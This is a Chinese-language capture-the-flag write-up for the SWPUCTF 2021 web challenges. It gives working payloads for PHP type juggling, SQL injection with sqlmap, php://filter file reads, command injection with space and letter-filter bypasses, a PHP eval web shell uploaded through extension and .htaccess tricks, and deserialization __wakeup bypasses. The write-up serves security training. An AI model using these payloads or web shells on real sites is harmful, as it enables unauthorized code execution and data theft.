# SWPUCTF 2021

## Web

### jicao

```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

Payload 如下

```
Body: id=wllmNB
Param: json={"x":"wllm"}
```

### easy\_md5

```php
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
```

Payload 如下

```
Body: password[]=2
Param: name[]=1
```

### easy\_sql

打开页面后 title 存在提示 参数是 `wllm` 。

```bash
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db --tables
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db -T test_tb --columns
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db -T test_tb -C flag --dump
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{66c831a1-4505-4bcd-8b89-b9620b715aeb} |
+----------------------------------------------+
```

### include

Payload 如下

```
file=php://filter/convert.base64-encode/resource=flag.php
```

### caidao

蚁剑利用 `$_POST['wllm']` 一把梭。

### easyrce

```
url=system("ls%20/");
```

回显 `bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var` ，

```
url=system("cat%20/flllllaaaaaaggggggg");
```

得到 flag。

### babyrce

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?>
```

设置 Cookie `admin=1` ，即可到达下一关 。

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?>
```

通过分析可得空格被过滤，可以通过 `$IFS$1` 来绕过，构造 Payload 如下

```
url=ls$IFS$1/
```

得到回显 `bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var` ，

```
url=cat$IFS$1/flllllaaaaaaggggggg
```

得到 flag。

### hardrce

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm'])) {
  $wllm = $_GET['wllm'];
  $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
  foreach ($blacklist as $blackitem) {
    if (preg_match('/' . $blackitem . '/m', $wllm)) {
      die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }
  }
  if(preg_match('/[a-zA-Z]/is',$wllm)) {
    die("Ra's Al Ghul说不能用字母哦！");
  }
  echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
  eval($wllm);
} else {
  echo "蔡总说：注意审题！！！";
}
?>
```

发现没有过滤 `%` ，又不能用字母，那就只能尝试下 Urlencode 取反绕过了。

```php
<?php
$a = 'system';
$b = 'ls$IFS$1/';
echo '(~'.urlencode(~$a).')(~'.urlencode(~$b).');';
// (~%8C%86%8C%8B%9A%92)(~%93%8C%DB%B6%B9%AC%DB%CE%D0);
```

构造 Payload 如下

```
wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DB%B6%B9%AC%DB%CE%D0);
```

可以得到回显如下

```
bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

通过构造 Urlencode 取反后通过如下 Payload 就可以得到 flag 了。

```php
<?php
$a = 'system';
$b = 'cat$IFS$1/flllllaaaaaaggggggg';
echo '(~'.urlencode(~$a).')(~'.urlencode(~$b).');';
// (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DB%B6%B9%AC%DB%CE%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

```
wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DB%B6%B9%AC%DB%CE%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

### Do\_you\_know\_http

修改以下两项

```http
User-Agent: WLLM
X-Forwarded-For: 127.0.0.1
```

即可得到 flag。

### ez\_unserialize

先用 dirsearch 找找文件\~

```bash
$ python dirsearch.py -u http://node2.anna.nssctf.cn:28104/
[11:43:36] 200 -    0B  - /flag.php
[11:49:43] 200 -   35B  - /robots.txt
```

访问 `/robots.txt` 可以得到 `/cl45s.php` ，访问可以得到以下代码。

```php
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

这是一道反序列题，先进行序列化构造。

```php
<?php
class wllm{

  public $admin;
  public $passwd;

  public function __construct(){
    $this->admin ="user";
    $this->passwd = "123456";
  }

  public function __destruct(){
    if($this->admin === "admin" && $this->passwd === "ctf"){
      include("flag.php");
      echo $flag;
    }else{
      echo $this->admin;
      echo $this->passwd;
      echo "Just a bit more!";
    }
  }
}

$a = new wllm();
$a->admin = "admin";
$a->passwd = "ctf";
echo serialize($a)
// O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

得到返回的值后构造 Payload 如下

```
p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

就得到 flag 。

### easyupload1.0

构造图片马

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundary8eWcQ5xJ0L37mCSt
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php eval($_POST[1]); ?>
------WebKitFormBoundary8eWcQ5xJ0L37mCSt
```

上传后得到回显 `./upload/shell.php` ，通过蚁剑一把梭发现根目录的 flag 是假的，那就找找环境变量罢，通过构造 Payload 如下

```
1=phpinfo();
```

F5 查找发现 flag 就在这里面。

### easyupload2.0

构造图片马

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundary8eWcQ5xJ0L37mCSt
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php eval($_POST[1]); ?>
------WebKitFormBoundary8eWcQ5xJ0L37mCSt
```

上传后得到回显 `php是不行滴` ，那就尝试修改后缀为其他（比如 `.phtml` ），上传成功后直接构造 Payload 如下

```
1=phpinfo();
```

F5 查找发现 flag 就在这里面。

### easyupload3.0

这次比上一次来说过滤了很多，改后缀名已经无法绕过了，那就试试改 `.htaccess` 罢。

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundaryfmADKqeYk0Yxw93y
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/png

<FilesMatch "png">
setHandler application/x-httpd-php
</FilesMatch>
------WebKitFormBoundaryfmADKqeYk0Yxw93y
```

发现上传成功，那就上传个图片马罢。

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundaryfmADKqeYk0Yxw93y
Content-Disposition: form-data; name="uploaded"; filename="1.png"
Content-Type: image/png

<?php eval($_POST[1]); ?>
------WebKitFormBoundaryfmADKqeYk0Yxw93y
```

上传成功后直接构造 Payload 如下

```
1=phpinfo();
```

F5 查找发现 flag 就在这里面。

### no\_wakeup

根据题目猜测是需要绕过反序列化时候的 `__wakeup()` 魔术方法。

```php
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```

可以通过修改反序列化对象的参数就可以绕过该魔术方法了，先进行序列化构造。

```php
<?php
class HaHaHa{


  public $admin;
  public $passwd;

  public function __construct(){
    $this->admin ="user";
    $this->passwd = "123456";
  }

  public function __wakeup(){
    $this->passwd = sha1($this->passwd);
  }

  public function __destruct(){
    if($this->admin === "admin" && $this->passwd === "wllm"){
      include("flag.php");
      echo $flag;
    }else{
      echo $this->passwd;
      echo "No wake up";
    }
  }
}

$a = new HaHaHa();
$a->admin = "admin";
$a->passwd = "wllm";
echo serialize($a);
```

可以得到值

```
O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

将对象参数个数 `2` 改成 `3` 即可绕过，即构造 Payload 如下

```
p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

### PseudoProtocols

题目标题为 伪协议 ，那就是一道 伪协议 的题目力。

题目存在 Param `wllm` ，构造 Payload 如下

```
wllm=php://filter/convert.base64-encode/resource=hint.php
```

就可以得到 `hint.php` 的代码如下

```php
<?php
//go to /test2222222222222.php
?>
```

前往提示内的文件可以得到以下代码

```php
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?>
```

需要使得 `a` 的值为 `I want flag` ，先将 `I want flag` 进行 base64 编码得到 `SSB3YW50IGZsYWc=` ，再构造 Payload 如下

```
a=data://text/plain;base64,SSB3YW50IGZsYWc=
```

就可以得到 flag 了。

### error

根据题目猜测是 SQL 报错注入（？，试试 sqlmap。

```bash
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 -D test_db --tables
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 -D test_db -T test_tb --columns
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 -D test_db -T test_tb -C flag --dump
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{d9d7ae7c-5b01-461c-836a-4e0f784d9784} |
+----------------------------------------------+
```
